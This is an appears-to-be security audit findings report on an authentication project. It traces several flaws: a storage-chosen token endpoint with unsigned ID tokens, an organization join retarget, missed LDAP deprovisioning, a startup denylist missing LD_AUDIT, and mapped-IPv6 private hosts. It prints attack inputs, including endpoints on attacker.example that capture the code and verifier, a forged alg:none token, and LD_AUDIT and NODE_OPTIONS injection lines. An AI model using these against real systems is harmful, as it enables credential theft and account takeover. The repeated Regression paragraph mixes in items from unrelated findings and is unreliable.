# Findings detail, run 1

Medium, high, and critical confirmed records. Low findings are in `REPORT.md` only. Reproduction stays inside the sandbox described in that report: no external network, dummy principals, and no live redemption or session mint.

## HIGH: Shared-origin storage chooses the federation token endpoint and an unsigned ID token is saved

Fingerprint: `app-core.federation.storage-selected-token-endpoint`.

### Trace

1. `entrypoint` `packages/app-core/src/lib/federation-pending.ts:37` `readRawPending`. Lower-trust entry. The PKCE record is read from origin localStorage key opensesame:federation:pkce, then sessionStorage. On the shared github.io origin that store is writable by every document of the account, not only this app path.
2. `propagation` `packages/app-core/src/lib/at-rest/web-storage.ts:88` `read`. localStore().getItem goes through sealedWebStorage. A value that is not an at-rest seal is returned as plaintext, so a same-origin writer does not need the at-rest key to plant the pending record. Overwriting a sealed value with plaintext is also returned as plaintext.
3. `propagation` `packages/app-core/src/lib/federation-pending.ts:45` `parsePending`. The JSON is overlap-cast with no check of tokenEndpoint, sessionCheckEndpoint, or jwksUri. A numeric createdAt older than ten minutes is stale. A missing createdAt is not aged out.
4. `propagation` `packages/app-core/src/lib/federation.ts:613` `completeSignInDefault`. The authorization code, redirect_uri, client_id, and code_verifier are POSTed to pending.tokenEndpoint as application/x-www-form-urlencoded with credentials omitted. The URL is not replaced with the compiled upstream token endpoint.
5. `propagation` `packages/app-core/src/lib/federation.ts:746` `readIdentity`. The ID token is decoded and checked for issuer, audience, expiry, and pairwise_sub or sub. The signature is not verified. Issuer https://shoo.dev and http://127.0.0.1:9090 are both in TRUSTED_UPSTREAMS, so an unchecked payload with one of those iss values passes when the envelope has three non-empty base64url segments.
6. `propagation` `packages/app-core/src/lib/federation.ts:506` `requireActiveUpstreamSession`. The session-check URL is pending.sessionCheckEndpoint or, if absent, the compiled URL. A missing URL, a transport error, or any HTTP status other than 401 returns success. The mock issuer has no compiled check.
7. `sink` `packages/app-core/src/lib/federation.ts:852` `saveSession`. When orgSlug is absent, saveSession writes the identity, including the attacker-supplied pairwise subject and the raw ID token, through writeFederationSessionJson. loadSession later accepts that stored token without a signature check when jwksUri is a string, and clears the row when it is not.

### Evidence

- `apps/pages/public/security-profile.json:3`: The checked-in Pages profile is shared_origin_demo, with canonicalOrigin https://tyler-r-kendrick.github.io and headerSecurity false on the following lines of the same object.
- `docs/security/security-boundaries.md:26`: Boundary 13: unrelated content on the same origin shares one browser trust boundary, and a path is not origin isolation. The shared-origin demo stays restricted; this is calibration, not a control that pins the token endpoint.
- `packages/app-core/src/lib/storage-ownership.ts:5`: The app states that a github.io origin belongs to every GitHub Pages project site of the account and that origin storage is not divided by path.
- `packages/app-core/src/lib/deployment-profile.ts:55`: mayPairLocalAuthority is false when resolveDeploymentProfile returns shared_origin_demo. The sandbox observed that result for the checked-in origin and profile. Shoo sign-in is not removed with pairing.
- `packages/app-core/src/lib/federation.ts:102`: The compiled Shoo upstream has token endpoint https://shoo.dev/token and session check https://shoo.dev/session/check. Exchange does not use these when the pending record supplies its own URLs.
- `packages/app-core/src/lib/federation.ts:112`: TRUSTED_UPSTREAMS includes the mock issuer http://127.0.0.1:9090 with a token endpoint and JWKS URL and no sessionCheckEndpoint. The comment says tests name it explicitly; the production allowlist still contains it.
- `packages/app-core/src/lib/federation.ts:520`: requireActiveUpstreamSession returns success for every HTTP status other than 401. A transport error returns at the catch above, and a missing endpoint returns before the fetch.
- `packages/app-core/src/lib/federation.ts:738`: The comment above readIdentity says the signature is not re-checked because the token arrived over TLS from the token endpoint, citing OIDC Core 3.1.3.7.
- `packages/app-core/src/lib/federation-restoration.ts:195`: readStoredSessionSync, used by loadSession, does not check the signature. Its JWT path requires a string jwksUri. The Shoo payload that omits jwksUri was written by saveSession, then loadSession returned null and cleared it. The same payload with a jwksUri string made loadSession return pairwise subject forged-subject.
- `packages/app-core/src/lib/at-rest/idb-key-store.ts:103`: unwrap decrypts the origin at-rest data key with the IndexedDB wrapping CryptoKey. That database is origin-scoped, so a same-origin script can use the key and rewrite a sealed value as well. The executed path did not need this, because plaintext is accepted.
- `packages/static-auth/src/passthrough.ts:65`: Calibration only: the static-auth Shoo passthrough posts to the pinned https://shoo.dev/session/check URL and requires status active. app-core federation does not share that control.
- `packages/app-core/src/lib/ambient-auth/oidc.ts:125`: The ambient variant POSTs the code and verifier to transaction.tokenEndpoint and then verifies with transaction.jwksUri. That path was read in source and was not part of the sandbox execution, because the default ambient seam returns null when ambient SSO is not installed.

### Principal and resource

A same-origin document writes the federation pending record so its issuer is a compiled trusted issuer and its token and session-check URLs are an attacker server. When OpenSesame completes the callback, it sends the code and PKCE verifier to that server and, if the server returns an unchecked token and the session check does not reject with HTTP 401, stores that token as the federation session when jwksUri is a string.

### Input

- `{"upstreamId":"shoo","issuer":"https://shoo.dev","verifier":"verifier-from-storage","state":"state-1","tokenEndpoint":"https://attacker.example/token","sessionCheckEndpoint":"https://attacker.example/check","redirectUri":"https://tyler-r-kendrick.github.io/OpenSesame/","clientId":"origin:https://tyler-r-kendrick.github.io","createdAt":<Date.now()>}`
- `{"upstreamId":"shoo","issuer":"https://shoo.dev","verifier":"verifier-from-storage","state":"state-1","tokenEndpoint":"https://attacker.example/token","sessionCheckEndpoint":"https://attacker.example/check","jwksUri":"https://shoo.dev/.well-known/jwks.json","redirectUri":"https://tyler-r-kendrick.github.io/OpenSesame/","clientId":"origin:https://tyler-r-kendrick.github.io","createdAt":<Date.now()>}`
- `JWT header {"alg":"none","typ":"JWT"}, payload {"iss":"https://shoo.dev","aud":"origin:https://tyler-r-kendrick.github.io","exp":4000000000,"pairwise_sub":"forged-subject","email":"forged@attacker.example"}, and a non-empty unchecked signature segment`
- `{"upstreamId":"mock","issuer":"http://127.0.0.1:9090","verifier":"verifier-mock","state":"state-1","tokenEndpoint":"https://attacker.example/token","jwksUri":"http://127.0.0.1:9090/jwks","clientId":"origin:https://tyler-r-kendrick.github.io","createdAt":<Date.now()>} with the same unchecked token shape and pairwise_sub mock-forged`

### Steps

- Bundle the real completeSignIn, readIdentity, requireActiveUpstreamSession, and sealed web-storage read with esbuild. Do not contact the network. Point fetch at a local stub that records the URL, method, and body and returns an unchecked ID token or an HTTP status.
- Install a host whose securityProfile is the checked-in shared_origin_demo object, whose page origin is https://tyler-r-kendrick.github.io and base path is /OpenSesame/, and whose local storage is an in-memory map. Defaults already leave remote Identity API and operator providers empty.
- Write the Shoo pending payload as plaintext under opensesame:federation:pkce, once without jwksUri and once with a string jwksUri, set the page search to ?code=attacker-code&state=state-1, and call completeSignIn, then loadSession.
- Repeat with the same attacker token endpoint and no sessionCheckEndpoint override so the compiled https://shoo.dev/session/check stub returns HTTP 401. Then repeat with the mock issuer payload and no session check. A Shoo payload with createdAt 0 is a negative check only. Also overwrite a sealed pending value with plaintext, and separately write opensesame:federation:session directly.
- Run that bundle through sandbox-run.sh with node --max-old-space-size=128. The sandbox allows PATH, HOME, TMPDIR, LANG, and LC_ALL, blocks external network, and sets a 1 GiB virtual-memory cap and a 25 second timeout. The script printed its results; process teardown in this sandbox then aborted on a node bundled-root-certificate assertion.

### Observed result

shared_origin_demo resolved for https://tyler-r-kendrick.github.io and mayPairLocalAuthority was false. Plaintext under opensesame:federation:pkce was returned by the sealed reader, including after a sealed value was overwritten. The Shoo payload with no jwksUri POSTed to https://attacker.example/token with grant_type, code attacker-code, the redirect URI, client id, and verifier, then POSTed to https://attacker.example/check, and saveSession wrote issuer https://shoo.dev, pairwise subject forged-subject, and email forged@attacker.example. The following loadSession returned null and removed that row. The same payload with jwksUri https://shoo.dev/.well-known/jwks.json left loadSession returning forged-subject. With the compiled Shoo session check left in place, the token POST still went to https://attacker.example/token and HTTP 401 from https://shoo.dev/session/check raised login_required and left no saved session. The mock issuer saved pairwise subject mock-forged after only the attacker token POST, and loadSession returned it. The same Shoo payload with createdAt 0 was refused as an expired sign-in and saved nothing. An empty signature segment was rejected as invalid_token. A direct plaintext write of opensesame:federation:session, with no token POST, made loadSession return pairwise subject direct-plant. Redemption of the code at the real Shoo token endpoint was not attempted.

### Conditions

- system_configuration: The deployment uses the checked-in shared_origin_demo profile, or any other origin where a second document can script the same origin. mayPairLocalAuthority is false there. A dedicated origin would require script execution inside the app origin, which this profile does not require.
- authorization_role: The attacker is another page or script on that origin, such as a sibling GitHub Pages project or the account's user-site path. That page can read and write origin localStorage and can open the origin IndexedDB. A page on a different origin cannot.
- data_state: For code theft, beginSignIn has stored a live pending record and the attacker rewrites tokenEndpoint before the callback. For a durable forged session through this exchange, the planted record includes a string jwksUri; omitting it still sends the code, but loadSession then clears the saved row. createdAt must be a recent number or omitted; createdAt 0 is older than ten minutes and was refused.
- user_interaction: The person loads the OpenSesame document on that origin with the callback code and state. Code theft also needs a sign-in to be in progress. Session forgery needs that document to process the callback query the attacker can open.

### Remediation

At exchange time, ignore tokenEndpoint and sessionCheckEndpoint from storage when the issuer has compiled endpoints. Post the code only to that compiled token endpoint, or, for an operator issuer with no compiled endpoint, to a URL whose origin equals the issuer origin. Call only the compiled Shoo session-check URL and accept the sign-in only on an explicit active result. Where no compiled check exists, verify the ID token signature against the compiled JWKS or refuse that issuer outside tests. Do not treat the loopback mock issuer as a production session issuer without one of those checks. Apply the same origin pin in the ambient exchange before verifyBrowserIdTokenClaims; that path was not executed here.

Regression: add a test that uses the payloads above against the fixed decision point and expects the code or verifier, the membership row, the LDAP principal, the mapped address, or `LD_AUDIT` to be refused. Do not assert a stronger result than the observation.

## HIGH: Tenant join grants organization membership to the caller after verified-email auto-link binds the identity to another principal

Fingerprint: `control-plane.org-join.email-retarget-membership`.

### Trace

1. `entrypoint` `packages/control-plane/src/routes/organizations.ts:585` `organizationRoutes.post /tenants/:slug/join`. The join route accepts any authenticated principal via requirePrincipal. createHonoApp installs authMiddleware on every path and mounts these routes at /v1/organizations; server.ts listens and dispatches into that app.
2. `propagation` `packages/control-plane/src/middleware/auth.ts:66` `authMiddleware bearer pst_`. A bearer beginning with pst_ resolves through provisionalTokens and an unexpired, unrevoked provisional session, then sets principalId from that session. Join does not require verified assurance.
3. `propagation` `packages/control-plane/src/routes/organizations.ts:611` `verifyOrgIdToken`. The route verifies the posted id_token for the organization SSO or SAML issuer with origin audiences and a 600 second maximum age before any membership is written.
4. `propagation` `packages/control-plane/src/routes/organizations.ts:627` `attachVerifiedExternalIdentity`. The verified subject is attached with emailLinkFields for trust source org. A DNS-verified organization domain lets the email act as an account join key.
5. `propagation` `packages/control-plane/src/services/identity-link.ts:144` `ownerPrincipalId`. When the tuple is free and findVerifiedByEmail returns a different principal for the verified normalized email, ownerPrincipalId becomes that principal.
6. `propagation` `packages/control-plane/src/services/identity-link.ts:169` `externalIdentities.create`. The new verified identity is stored with principalId ownerPrincipalId and returned on the success result. A tuple already owned by another principal returns identity_collision instead.
7. `propagation` `packages/control-plane/src/routes/organizations.ts:659` `jitJoinOrganization principalId`. The handler still passes the caller principalId into jitJoinOrganization and uses provisionedRoleForSubject(org, assertion.sub) for the role.
8. `sink` `packages/control-plane/src/routes/organizations.ts:299` `organizationMemberships.upsert`. When the caller has no existing membership, the store upsert writes organizationId, the caller principalId, and role input.role or member. The route then returns 201 at line 669 when the row was created.

### Evidence

- `packages/control-plane/src/routes/organizations.ts:659`: jitJoinOrganization is called with principalId taken from the authenticated caller, not from attached.identity.principalId.
- `packages/control-plane/src/services/identity-link.ts:97`: The function contract says the returned identity.principalId is the authoritative owner and callers that minted a provisional principal must bind to that id.
- `packages/control-plane/src/services/identity-link.ts:169`: The created ExternalIdentity.principalId is ownerPrincipalId, which is the verified-email owner when that owner is not the caller.
- `packages/control-plane/src/services/identity-link.ts:256`: The success return includes that identity, so the join handler can read the owner principal and does not.
- `packages/control-plane/src/routes/interactions.ts:641`: Hosted federated sign-in sets accountId from attached.identity.principalId and later passes accountId to jitJoinOrganization.
- `packages/control-plane/src/routes/interactions-ldap.ts:324`: The LDAP bind sets accountId from attached.identity.principalId and passes accountId into jitJoinOrganization.
- `packages/control-plane/src/interactions/saml.ts:912`: SAML completion sets principalId from attached.identity.principalId and passes that principalId into jitJoinOrganization.
- `packages/control-plane/src/services/email-authority.ts:37`: Organization email claims join accounts only for a domain the organization proved via DNS-TXT. That is the condition that makes the retarget reachable; an unverified domain does not.
- `packages/control-plane/src/routes/scim-effects.ts:60`: provisionedRoleForSubject returns owner, admin, or member from an active SCIM user raw urn:opensesame:params:scim:2.0:role for the asserted subject, so the caller's new membership can be owner.
- `packages/control-plane/src/routes/organizations.ts:302`: The upsert role is input.role when present and member otherwise. An absent SCIM row therefore still creates a member membership for the caller.
- `packages/control-plane/src/proofs/org-owner.ts:69`: orgOwner accepts the actor when membership.role is owner and does not read principal assurance. Organization patch and member routes reach that proof through requirePrincipal and asOrgOwner only.

### Principal and resource

A principal that already holds its own live provisional bearer presents an organization id_token whose verified email is already owned by a different principal.

### Input

- `POST /v1/organizations/tenants/acme/join`
- `Authorization: Bearer pst_caller_local_check_token`
- `{"method":"sso","idToken":"verified-id-token"}`

### Steps

- Use an in-memory fixture: active org acme with ssoIssuer https://idp.acme.test, DNS-verified domain acme.test, victim principal prn_victim_existing with a verified external identity for alice@acme.test, an active SCIM user externalId idp-alice whose role attribute is owner, and caller principal prn_caller_guest assurance provisional bound to bearer pst_caller_local_check_token.
- Do not fetch JWKS. Pass the verified assertion object verifyOrgIdToken returns on success: sub idp-alice, email alice@acme.test, emailVerified true. Call the repository emailLinkFields with trust source org, attachVerifiedExternalIdentity with the caller principal id, provisionedRoleForSubject, and jitJoinOrganization with principalId set to that same caller id, which is the argument at organizations.ts:659. Authenticate the bearer with the repository authMiddleware.
- The sandbox cannot load the whole organizationRoutes module: importing oidc-provider, which the oauth-provider barrel pulled in by org-assertion.ts evaluates, aborts under ulimit -v 1048576. The run therefore executes those repository functions rather than the route closure. Signature checks remain the source of verifyOrgIdToken and are not re-executed.
- The bounded run was sandbox-run.sh on this verifier scratch directory executing node join-fns.bundle.mjs, which writes check-output.txt and exits 0.

### Observed result

check-output.txt: join=201 role=owner slug=acme; caller prn_caller_guest remained assurance provisional and state provisional; callerMembership=owner; victimMembership=none; callerIdentities=none; victimIdentities were https://accounts.example.test|google-alice and the new https://idp.acme.test|idp-alice, both email alice@acme.test verified true, both principalId prn_victim_existing. Those rows were written by repository attachVerifiedExternalIdentity and jitJoinOrganization. organizations.ts:668 returns 201 when that join reports created. GET /v1/organizations was not re-executed; its handler at organizations.ts:419 lists the caller membership, which is this owner row.

### Conditions

- authentication_level: The caller presents a live pst_ provisional bearer for a principal different from the verified-email owner. Join uses requirePrincipal and accepts provisional assurance.
- data_state: The organization is active, has an SSO or SAML issuer for the requested method, and has a DNS-verified email domain matching the token email, so emailLinkFields marks the address verified.
- data_state: Another principal already has a verified external identity for that normalized email, and the (kind, issuer, subject) tuple is not yet stored. An existing foreign tuple returns 409 identity_collision before membership.
- data_state: The caller has no membership in the organization yet. An existing membership row is returned unchanged, so this path does not raise an existing role.
- system_configuration: The id_token verifies for the organization issuer: allowed RS256 or ES256, issuer origin match, audience origin:<configured CORS origin or publicUrl origin>, and age at most 600 seconds. Private issuer hosts are blocked when allowDevDefaults is false. If provisioningEnabled is set, the subject must also be an active SCIM user or the join returns not_provisioned before upsert.
- data_state: An active SCIM user for the subject whose raw role is owner, admin, or member sets the new membership role. With no active row and provisioning disabled, the role written for the caller is member.

### Remediation

Use attached.identity.principalId as the membership principal. When that id differs from the caller, upsert membership for the identity owner and return 409 identity_collision to the caller. Do not write a membership for the caller and do not replace the caller's session with the other principal.

Regression: add a test that uses the payloads above against the fixed decision point and expects the code or verifier, the membership row, the LDAP principal, the mapped address, or `LD_AUDIT` to be refused. Do not assert a stronger result than the observation.

## HIGH: SCIM deprovision does not revoke members who signed in through the organization LDAP directory

Fingerprint: `control-plane.scim.principalsForSubject.omits-directory-issuer`.

### Trace

1. `entrypoint` `packages/control-plane/src/routes/scim.ts:441` `PATCH /:organizationId/scim/v2/Users/:id`. An authenticated provisioning token or active owner submits a PatchOp that sets active to false. authenticate has already bound the caller to this organization. DELETE of an active user is the same deprovision.
2. `propagation` `packages/control-plane/src/routes/scim.ts:487` `deprovision call`. After the SCIM row is saved inactive, deprovision is the only revocation. The handler then audits success and returns 200 whether or not any principal was found.
3. `propagation` `packages/control-plane/src/routes/scim-effects.ts:87` `principalsForSubject`. Issuers are only organization.ssoIssuer and organization.samlIssuer. kind ldap is queried, but with those issuers, not ldapIssuer of the org LDAP config.
4. `sink` `packages/control-plane/src/routes/scim-effects.ts:140` `deprovision`. revokeOrganizationMembership runs only for principals returned by that lookup. The LDAP principal is not among them, so the membership row and provisional sessions stay.

### Evidence

- `packages/control-plane/src/routes/scim-effects.ts:20`: ORG_IDENTITY_KINDS includes ldap, so a directory identity is in scope only if its issuer equals ssoIssuer or samlIssuer.
- `packages/control-plane/src/routes/scim-effects.ts:87`: The issuer list is organization.ssoIssuer and organization.samlIssuer and nothing else. LDAP config and SAML metadata are not read.
- `packages/control-plane/src/routes/scim-effects.ts:103`: A found principal is revoked only when it has a membership in this organization. That check is never reached for an identity stored under the directory issuer.
- `packages/control-plane/src/routes/scim-effects.ts:156`: applyRole resolves principals through the same principalsForUser lookup, so a Groups role push misses the same directory identities.
- `packages/control-plane/src/interactions/ldap.ts:140`: ldapIssuer returns protocol plus host of the directory URL, dropping path and query, for example ldaps://dir.acme.example:636.
- `packages/control-plane/src/routes/interactions-ldap.ts:306`: attachVerifiedExternalIdentity persists kind ldap and that ldapIssuer value as the identity used on later sign-in.
- `packages/control-plane/src/routes/organizations.ts:350`: Membership removal happens only inside revokeOrganizationMembership, which deprovision does not call when the lookup misses.
- `packages/control-plane/src/routes/organizations.ts:365`: The same helper deletes provisional sessions for that principal only after the membership row was removed.
- `packages/control-plane/src/routes/scim.ts:504`: The PATCH responds 200 with the inactive user after deprovision returns, with no check that a membership was removed.
- `packages/control-plane/src/interactions/saml.ts:972`: If samlIssuer is empty, SAML admission stores the metadata entityID instead, which this issuer list also does not search. A non-empty samlIssuer is stored and is searched.
- `packages/control-plane/src/routes/organizations.ts:279`: A fresh sign-in consults the inactive SCIM row only when provisioningEnabled is set. That does not remove the membership or provisional session the missed revoke left behind.

### Principal and resource

A member who bound through the organization LDAP directory keeps their membership and existing provisional bearer after the directory deactivates the matching SCIM user.

### Input

- `externalId=carol userName=carol@acme.example identity kind=ldap issuer=ldaps://dir.acme.example:636 subject=carol`
- `organization.ssoIssuer=https://idp.example samlIssuer unset`
- `PATCH Operations replace path active value false`

### Steps

- Type-strip packages/control-plane/src/routes/scim-effects.ts and the ldapIssuer function from packages/control-plane/src/interactions/ldap.ts. The sandbox virtual-memory limit cannot instantiate the TypeScript stripper.
- Call the stripped ldapIssuer with url ldaps://dir.acme.example:636/dc=acme?x=1.
- Call the stripped deprovision with revokeOrganizationMembership recording its arguments. Offer an external identity only for kind ldap, issuer ldaps://dir.acme.example:636, subject carol, mapped to principal prn_ldap, and a membership for every principal id.
- Use a SCIM user whose externalId is carol and whose userName is carol@acme.example, on an organization whose ssoIssuer is https://idp.example and whose samlIssuer is unset.
- Repeat with an oidc identity for subject ada at issuer https://idp.example mapped to prn_oidc, and with a saml identity offered only at issuer https://idp.example/metadata for subject bea.

### Observed result

ldapIssuer returned ldaps://dir.acme.example:636. For carol, findByTuple ran ten times and every issuer was https://idp.example; the directory issuer was never queried and revoke was not called. For ada, revoke was called with prn_oidc and reason scim_deactivated. For bea, https://idp.example/metadata was never queried and revoke was not called.

### Conditions

- authentication_level: The deactivation is performed by a live SCIM provisioning token for the organization, or by an active owner session, both of which authenticate accepts.
- data_state: The member has an external identity kind ldap, issuer ldapIssuer of this organization's LDAP config, and subject equal to the SCIM user's externalId or userName, plus an organization membership and a live provisional session.
- system_configuration: The organization has an LDAP directory configured. Its ssoIssuer and samlIssuer are not that directory URL. The same miss applies to a native SAML identity only when samlIssuer is empty and the stored issuer is the metadata entityID.

### Remediation

When resolving a directory subject, also search kind ldap under ldapIssuer of this organization's LDAP config, and search kind saml under the issuer admitSamlSubject stores: organization.samlIssuer when it is non-empty, otherwise the metadata entityID used when native SAML is configured without samlIssuer. Keep the membership check so another tenant's principal is still ignored.

Regression: add a test that uses the payloads above against the fixed decision point and expects the code or verifier, the membership row, the LDAP principal, the mapped address, or `LD_AUDIT` to be refused. Do not assert a stronger result than the observation.

## HIGH: Shared startup denylist omits LD_AUDIT, so an env template loads an audit object in the credential-bearing child

Fingerprint: `packages/cli/startup-env-denylist-omits-ld-audit`.

### Trace

1. `entrypoint` `packages/cli/src/parity-commands.ts:165` `runEnv`. env run reads the caller-supplied template and passes its text to the password-agent runFile path. The template is the lower-trust input; the child command is a separate argument.
2. `propagation` `packages/app-core/src/lib/password-agent/env.ts:128` `runFile`. runFile calls validateRunTemplate and, on success, forwards the same contents to the host runEnvFile port. A literal LD_AUDIT assignment is not rejected.
3. `propagation` `packages/app-core/src/lib/password-agent/startup-env.ts:30` `validateRunTemplate`. Each parsed assignment name is passed to assertSafeRunName, which rejects only an uppercase match in credentialStartupEnvKeys. LD_AUDIT is accepted.
4. `propagation` `spec/conformance/2password-policy.json:41` `credentialStartupEnvKeys`. LD_PRELOAD is reserved in this array. The array also lists LD_LIBRARY_PATH and does not contain LD_AUDIT. The TypeScript policy import and the Rust include_str both compile this file.
5. `propagation` `packages/cli/src/parity-node.ts:237` `runEnvFileSnapshot`. The accepted template is written unchanged to an owner-only snapshot and supplied as op run --env-file. Nothing removes LD_AUDIT from those bytes.
6. `sink` `packages/cli/src/parity-node.ts:163` `runOpChild`. op is spawned with helperEnvironment, which still holds the service token and does not remove an unlisted LD_AUDIT. The provider applies the env file to the node wrapper. The wrapper script at line 151 deletes OP_SERVICE_ACCOUNT_TOKEN only after the dynamic linker has loaded LD_AUDIT.

### Evidence

- `spec/conformance/2password-policy.json:41`: The credentialStartupEnvKeys array includes LD_PRELOAD and LD_LIBRARY_PATH and has no LD_AUDIT entry. It contains 18 names and ends at DOTNET_STARTUP_HOOKS.
- `packages/app-core/src/lib/password-agent/policy.ts:2`: The TypeScript password-agent policy is this JSON file, so the CLI helper and the app-core validators share the incomplete list.
- `packages/app-core/src/lib/password-agent/startup-env.ts:6`: assertSafeRunName throws only when the uppercase name is a member of credentialStartupEnvKeys.
- `packages/cli/src/parity-node.ts:207`: helperEnvironment deletes only names whose uppercase form is in credentialStartupEnvKeys. OP_SERVICE_ACCOUNT_TOKEN is not in that list and is kept.
- `packages/cli/src/parity-node.ts:151`: The fixed node wrapper deletes OP_SERVICE_ACCOUNT_TOKEN in JavaScript after the process has started.
- `packages/app-core/src/lib/password-agent/auth.ts:91`: authenticatedPort merges the service-account environment into runEnvFile before the snapshot is executed, which is how the wrapper receives the token.
- `packages/cli/src/fixtures/password-agent/op.cjs:107`: The repository op run stand-in copies the parent environment, overlays every env-file KEY=value line, substitutes op:// values, and spawnSyncs the wrapper with that environment.
- `crates/connector-host/src/password_agent/policy.rs:15`: The Rust policy is include_str of the same JSON, so the Rust password agent uses the same incomplete key list.
- `crates/connector-host/src/password_agent/env.rs:21`: credential_startup_key matches a name only by eq_ignore_ascii_case against credential_startup_env_keys.
- `crates/connector-host/src/password_agent/env.rs:74`: validate_run_template rejects an assignment only when credential_startup_key is true, so a literal LD_AUDIT line is kept.
- `apps/cli/src/password_agent/io.rs:17`: scrub_startup env_removes each policy name and, in the following loop, only current names for which credential_startup_key is true. Unlisted LD_AUDIT is not removed.
- `apps/cli/src/password_agent/credential.rs:168`: When the parent environment holds a service-account token, authenticate() copies it onto the helper command after startup scrubbing.
- `apps/cli/src/password_agent/consume.rs:113`: This argument passes the unchanged template snapshot to op run --env-file. The snapshot is not filtered to drop LD_AUDIT.
- `apps/cli/src/password_agent/consume.rs:73`: internal_exec removes OP_SERVICE_ACCOUNT_TOKEN from the selected command and does not remove LD_AUDIT. That removal runs only after internal-exec itself has started.
- `docs/adr/0177-password-workflow-surface-boundaries.md:117`: Both CLI adapters are required to reserve interpreter startup variables before provider execution and to remove inherited startup hooks before authenticating.

### Principal and resource

An author of an environment template supplies a literal LD_AUDIT assignment naming a shared object they control, next to an ordinary op:// reference. The operator runs that template through the credential helper, which is supposed to reject startup hooks such as LD_PRELOAD and NODE_OPTIONS before the service token is exposed.

### Input

- `API=op://vault/item/field`
- `LD_AUDIT=/home/vscode/security-audit-skill/OpenSesame/run-1/agents/v15-packages-cli-startup-env-denylist-omits/scratch/auditlib.so`
- `LD_PRELOAD=/home/vscode/security-audit-skill/OpenSesame/run-1/agents/v15-packages-cli-startup-env-denylist-omits/scratch/auditlib.so`
- `NODE_OPTIONS=--require /tmp/x.cjs`
- `OP_SERVICE_ACCOUNT_TOKEN=ops_canary`

### Steps

- Build a local glibc shared object that exports la_version and whose constructor records only whether LD_AUDIT is set and whether OP_SERVICE_ACCOUNT_TOKEN equals the dummy value ops_canary.
- Read credentialStartupEnvKeys from spec/conformance/2password-policy.json.
- In the approved sandbox, call validateRunTemplate, assertSafeRunName, and helperEnvironment from the TypeScript password-agent sources on a template containing the op:// line and the literal LD_AUDIT line, and on the LD_PRELOAD and NODE_OPTIONS controls.
- Copy packages/cli/src/fixtures/password-agent/op.cjs to an absolute PATH directory other than the process cwd, set PARITY_DB and PARITY_LOG, and call runEnvFileSnapshot with that template, options.env OP_SERVICE_ACCOUNT_TOKEN=ops_canary, and a child command of node -e process.exit(0). Do not start the parent with LD_AUDIT.
- Separately, exec a dynamically linked ELF after removing the dummy token and every name that case-insensitively matches the policy list, which is the scrub_startup rule, and compare it with a preload-only run after the same removal and with an unsanitized LD_PRELOAD control.
- Stop after the marker lines. Do not use a real service-account token or continue into the selected command.

### Observed result

The policy contained 18 keys, included LD_PRELOAD, and did not contain LD_AUDIT. validateRunTemplate accepted the LD_AUDIT template and rejected LD_PRELOAD and NODE_OPTIONS. assertSafeRunName accepted ld_audit. helperEnvironment kept LD_AUDIT and ops_canary and removed LD_PRELOAD and NODE_OPTIONS. The parent process did not have LD_AUDIT. runEnvFileSnapshot against the repository op fixture exited 0. The audit object recorded ctor saw_canary=1 has_ld_audit=1 and la_version in the node wrapper, then ctor saw_canary=0 has_ld_audit=1 and la_version in the grandchild after the wrapper deleted the token. A separate exec that removed only those 18 names and the dummy token kept LD_AUDIT, and that glibc child called la_version and its constructor. The same removal applied to LD_PRELOAD alone did not load the object. An unsanitized LD_PRELOAD control ran the constructor and did not call la_version. The reproduction called those TypeScript functions directly, with the dummy token supplied the way authenticatedPort attaches it. The Rust opensesame binary was not executed.

### Conditions

- user_interaction: The operator runs env run, or the Rust password-agent env run, on a template the attacker can influence. The child command is chosen separately from the template.
- data_state: The template contains a literal LD_AUDIT assignment whose value is a path to an attacker-controlled glibc audit object, and a service-account token is present in the helper environment. The parent process is not itself started under LD_AUDIT.
- environmental_dependency: The credential child is a dynamically linked ELF started by glibc, which loads LD_AUDIT and calls la_version before main. This was observed with Node v22.23.3 on Linux. macOS dyld and Windows do not honor LD_AUDIT; their listed equivalents are already denied.
- third_party_dependency: The provider applies env-file assignments to the child and forwards the parent environment. That is what packages/cli/src/fixtures/password-agent/op.cjs does for op run, which is the provider stand-in used by this repository.

### Remediation

Add LD_AUDIT to credentialStartupEnvKeys. The TypeScript validators and helperEnvironment and the Rust validators and scrub_startup all read this list, so one entry reserves the hook in templates, assignment names, and helper environments. The node wrapper cannot delete the service token before the dynamic linker runs, so the variable must be rejected and stripped before exec. Extend the existing startup-key regression, which already iterates the shared list, to require that LD_AUDIT is rejected in the same case variants as LD_PRELOAD and removed before authenticate() attaches a token.

Regression: add a test that uses the payloads above against the fixed decision point and expects the code or verifier, the membership row, the LDAP principal, the mapped address, or `LD_AUDIT` to be refused. Do not assert a stronger result than the observation.

## MEDIUM: Invocation policy admits IPv4-mapped loopback and private request URIs

Fingerprint: `crates/authenticator-core/host_is_private/ipv4-mapped-request-uri`.

### Trace

1. `entrypoint` `apps/android/android/app/src/main/AndroidManifest.xml:11` `MainActivity`. MainActivity is exported with no permission and handles VIEW data. Another app can set an explicit intent whose URI string uses the configured invocation origin; the intent-filter host does not authenticate the caller.
2. `propagation` `apps/android/android/app/src/main/java/dev/opensesame/authenticator/MainActivity.kt:71` `MainActivity.handleIntent`. https URIs are admitted solely by the Result of validatePlatformInvocation; a successful return is treated as a safe protocol request.
3. `propagation` `crates/authenticator-core/src/lib.rs:346` `host_is_private`. The IPv6 arm does not unwrap IPv4-mapped addresses, so ::ffff:7f00:1 (127.0.0.1), ::ffff:a9fe:a9fe (169.254.169.254), and mapped RFC1918 hosts are not private.
4. `sink` `apps/android/android/app/src/main/java/dev/opensesame/authenticator/MainActivity.kt:80` `MainActivity.handleIntent`. The accepted protocol_uri, including the mapped request host, is parsed and set as the VIEW data for OpenId4VpActivity. The oid4vci branch passes the same string to launchOpenID4VCIProvisioning.

### Evidence

- `crates/authenticator-core/src/lib.rs:270`: Private request URIs are rejected only when host_is_private is true. allow_private_request_uris is false for InvocationPolicy::new, which is what validate_platform_invocation uses.
- `crates/authenticator-core/src/lib.rs:346`: IPv6 classification omits to_ipv4_mapped. Bracketed IPv4-mapped hosts stay IPv6, so ::ffff:7f00:1 misses every flag in this match while dotted 127.0.0.1 is rejected.
- `crates/authenticator-core/src/lib.rs:146`: On success the normalized request URL is copied into payload, and the following match builds an openid4vp or openid-credential-offer protocol URI from that string.
- `apps/android/android/app/src/main/java/dev/opensesame/authenticator/MainActivity.kt:80`: OID4VP success starts OpenId4VpActivity with setData(Uri.parse(invocation.protocolUri)). There is no second private-host check.
- `apps/android/android/app/src/main/java/dev/opensesame/authenticator/MainActivity.kt:85`: OID4VCI success passes invocation.protocolUri to launchOpenID4VCIProvisioning.

### Principal and resource

